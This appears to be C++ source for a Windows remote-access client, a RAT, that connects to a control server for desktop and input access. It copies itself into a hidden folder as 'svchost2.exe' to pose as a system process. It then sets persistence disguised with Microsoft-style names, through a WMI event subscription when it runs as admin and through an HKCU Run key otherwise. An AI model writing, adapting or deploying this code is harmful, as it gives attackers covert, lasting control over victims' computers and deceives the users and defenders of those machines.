#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

#include "Network.h"
#include "InputHandler.h"
#include "DesktopHandler.h"
#include "Compression.h"

bool SelfCopyToHiddenFolder()
{
    char szCurrentPath[MAX_PATH] = {0};
    if (GetModuleFileNameA(NULL, szCurrentPath, MAX_PATH) == 0)
    {
        std::cerr << "[SelfCopy] Failed to get the module file path.\n";
        return false;
    }
    std::string currentExePath(szCurrentPath);
    char szLocalAppData[MAX_PATH] = {0};
    if (GetEnvironmentVariableA("LOCALAPPDATA", szLocalAppData, MAX_PATH) == 0)
    {
        std::cerr << "[SelfCopy] Failed to get the LOCALAPPDATA environment variable.\n";
        return false;
    }
    std::string targetDir = std::string(szLocalAppData) + "\\Microsoft\\Win32Components";
    DWORD dwAttr = GetFileAttributesA(targetDir.c_str());
    if (dwAttr == INVALID_FILE_ATTRIBUTES)
    {
        if (!CreateDirectoryA(targetDir.c_str(), NULL))
        {
            std::cerr << "[SelfCopy] Failed to create directory: " << targetDir << "\n";
            return false;
        }
    }
    SetFileAttributesA(targetDir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    std::string targetExe = targetDir + "\\svchost2.exe";
    if (!CopyFileA(currentExePath.c_str(), targetExe.c_str(), FALSE))
    {
        std::cerr << "[SelfCopy] CopyFile failed, error: " << GetLastError() << "\n";
        return false;
    }

    std::cout << "[SelfCopy] File successfully copied to hidden directory: " << targetExe << "\n";
    return true;
}

bool IsRunningAsAdmin()
{
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS,
                                 0, 0, 0, 0, 0, 0,
                                 &adminGroup))
    {
        if (!CheckTokenMembership(NULL, adminGroup, &isAdmin))
        {
            isAdmin = FALSE;
        }
        FreeSid(adminGroup);
    }
    return isAdmin == TRUE;
}

bool CreateWMIPersistenceTrigger(const std::string &targetExe)
{
    HRESULT hr;
    IWbemLocator* pLocator = NULL;
    IWbemServices* pServices = NULL;

    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        std::cerr << "[WMI] CoInitializeEx failed. Error: 0x" << std::hex << hr << "\n";
        return false;
    }

    hr = CoInitializeSecurity(
            NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_DEFAULT,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_NONE,
            NULL);
    if (FAILED(hr))
    {
        std::cerr << "[WMI] CoInitializeSecurity failed. Error: 0x" << std::hex << hr << "\n";
        CoUninitialize();
        return false;
    }

    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                          IID_IWbemLocator, (LPVOID *)&pLocator);
    if (FAILED(hr))
    {
        std::cerr << "[WMI] Failed to create IWbemLocator. Error: 0x" << std::hex << hr << "\n";
        CoUninitialize();
        return false;
    }

    hr = pLocator->ConnectServer(
            _bstr_t(L"ROOT\\subscription"),
            NULL,
            NULL,
            0,
            NULL,
            0,
            0,
            &pServices);
    if (FAILED(hr))
    {
        std::cerr << "[WMI] Failed to connect to ROOT\\subscription. Error: 0x" << std::hex << hr << "\n";
        pLocator->Release();
        CoUninitialize();
        return false;
    }

    hr = CoSetProxyBlanket(
            pServices,
            RPC_C_AUTHN_WINNT,
            RPC_C_AUTHZ_NONE,
            NULL,
            RPC_C_AUTHN_LEVEL_CALL,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_NONE);
    if (FAILED(hr))
    {
        std::cerr << "[WMI] Failed to set proxy blanket. Error: 0x" << std::hex << hr << "\n";
        pServices->Release();
        pLocator->Release();
        CoUninitialize();
        return false;
    }

    IWbemClassObject* pFilterClass = NULL;
    hr = pServices->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
    if (FAILED(hr))
    {
        std::cerr << "[WMI] Failed to get __EventFilter object. Error: 0x" << std::hex << hr << "\n";
        pServices->Release();
        pLocator->Release();
        CoUninitialize();
        return false;
    }
    IWbemClassObject* pFilterInstance = NULL;
    hr = pFilterClass->SpawnInstance(0, &pFilterInstance);
    pFilterClass->Release();
    if (FAILED(hr))
    {
        std::cerr << "[WMI] Failed to spawn __EventFilter instance. Error: 0x" << std::hex << hr << "\n";
        pServices->Release();
        pLocator->Release();
        CoUninitialize();
        return false;
    }

    VARIANT var;
    VariantInit(&var);
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"Microsoft_Win32Filter");
    hr = pFilterInstance->Put(L"Name", 0, &var, 0);
    VariantClear(&var);

    std::wstring query = L"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA \"Win32_ComputerSystem\"";
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(query.c_str());
    hr = pFilterInstance->Put(L"Query", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"WQL");
    hr = pFilterInstance->Put(L"QueryLanguage", 0, &var, 0);
    VariantClear(&var);

    hr = pServices->PutInstance(pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pFilterInstance->Release();
    if (FAILED(hr))
    {
        std::cerr << "[WMI] Failed to put __EventFilter instance. Error: 0x" << std::hex << hr << "\n";
        pServices->Release();
        pLocator->Release();
        CoUninitialize();
        return false;
    }

    IWbemClassObject* pConsumerClass = NULL;
    hr = pServices->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pConsumerClass, NULL);
    if (FAILED(hr))
    {
        std::cerr << "[WMI] Failed to get CommandLineEventConsumer class. Error: 0x" << std::hex << hr << "\n";
        pServices->Release();
        pLocator->Release();
        CoUninitialize();
        return false;
    }
    IWbemClassObject* pConsumerInstance = NULL;
    hr = pConsumerClass->SpawnInstance(0, &pConsumerInstance);
    pConsumerClass->Release();
    if (FAILED(hr))
    {
        std::cerr << "[WMI] Failed to spawn CommandLineEventConsumer instance. Error: 0x" << std::hex << hr << "\n";
        pServices->Release();
        pLocator->Release();
        CoUninitialize();
        return false;
    }
    VariantInit(&var);
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"Microsoft_Win32Consumer");
    hr = pConsumerInstance->Put(L"Name", 0, &var, 0);
    VariantClear(&var);

    std::wstring targetExeW = std::wstring(targetExe.begin(), targetExe.end());
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(targetExeW.c_str());
    hr = pConsumerInstance->Put(L"CommandLineTemplate", 0, &var, 0);
    VariantClear(&var);

    hr = pServices->PutInstance(pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pConsumerInstance->Release();
    if (FAILED(hr))
    {
        std::cerr << "[WMI] Failed to put CommandLineEventConsumer instance. Error: 0x" << std::hex << hr << "\n";
        pServices->Release();
        pLocator->Release();
        CoUninitialize();
        return false;
    }

    IWbemClassObject* pBindingClass = NULL;
    hr = pServices->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBindingClass, NULL);
    if (FAILED(hr))
    {
        std::cerr << "[WMI] Failed to get __FilterToConsumerBinding class. Error: 0x" << std::hex << hr << "\n";
        pServices->Release();
        pLocator->Release();
        CoUninitialize();
        return false;
    }
    IWbemClassObject* pBindingInstance = NULL;
    hr = pBindingClass->SpawnInstance(0, &pBindingInstance);
    pBindingClass->Release();
    if (FAILED(hr))
    {
        std::cerr << "[WMI] Failed to spawn __FilterToConsumerBinding instance. Error: 0x" << std::hex << hr << "\n";
        pServices->Release();
        pLocator->Release();
        CoUninitialize();
        return false;
    }
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"__EventFilter.Name=\"Microsoft_Win32Filter\"");
    hr = pBindingInstance->Put(L"Filter", 0, &var, 0);
    VariantClear(&var);
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"CommandLineEventConsumer.Name=\"Microsoft_Win32Consumer\"");
    hr = pBindingInstance->Put(L"Consumer", 0, &var, 0);
    VariantClear(&var);
    hr = pServices->PutInstance(pBindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pBindingInstance->Release();
    if (FAILED(hr))
    {
        std::cerr << "[WMI] Failed to put __FilterToConsumerBinding instance. Error: 0x" << std::hex << hr << "\n";
        pServices->Release();
        pLocator->Release();
        CoUninitialize();
        return false;
    }
    else
    {
        std::cout << "[WMI] WMI trigger successfully created for file: " << targetExe << "\n";
    }

    pServices->Release();
    pLocator->Release();
    CoUninitialize();
    return true;
}

bool SetUserRegistryPersistence(const std::string &targetExe)
{
    HKEY hKey = NULL;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,
                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS)
    {
        std::cerr << "[Registry] Failed to open HKCU registry key, error: " << result << "\n";
        return false;
    }
    result = RegSetValueExA(hKey, "MicrosoftUpdate", 0, REG_SZ,
                            reinterpret_cast<const BYTE*>(targetExe.c_str()),
                            static_cast<DWORD>(targetExe.size() + 1));
    RegCloseKey(hKey);
    if (result != ERROR_SUCCESS)
    {
        std::cerr << "[Registry] Failed to set autorun value, error: " << result << "\n";
        return false;
    }
    std::cout << "[Registry] Autorun successfully set in registry for user: " << targetExe << "\n";
    return true;
}

int main()
{
    SelfCopyToHiddenFolder();
    char szLocalAppData[MAX_PATH] = {0};
    GetEnvironmentVariableA("LOCALAPPDATA", szLocalAppData, MAX_PATH);
    std::string targetDir = std::string(szLocalAppData) + "\\Microsoft\\Win32Components";
    std::string targetExe = targetDir + "\\svchost2.exe";
    bool admin = IsRunningAsAdmin();
    std::cout << "[Main] Running as " << (admin ? "administrator" : "user") << ".\n";
    if (admin)
    {
        if (!CreateWMIPersistenceTrigger(targetExe))
        {
            std::cerr << "[Main] Failed to create WMI trigger.\n";
        }
    }
    else
    {
        if (!SetUserRegistryPersistence(targetExe))
        {
            std::cerr << "[Main] Failed to set registry autorun.\n";
        }
    }

    std::string ip = "127.0.0.1";
    int port = 1080;
    std::cout << "[Client] Using server: " << ip << " Port: " << port << std::endl;
    std::thread tInput(InputThreadFunc, ip, port);
    Sleep(1000);
    std::thread tDesktop(DesktopThreadFunc, ip, port);
    tInput.join();
    tDesktop.join();

    return 0;
}

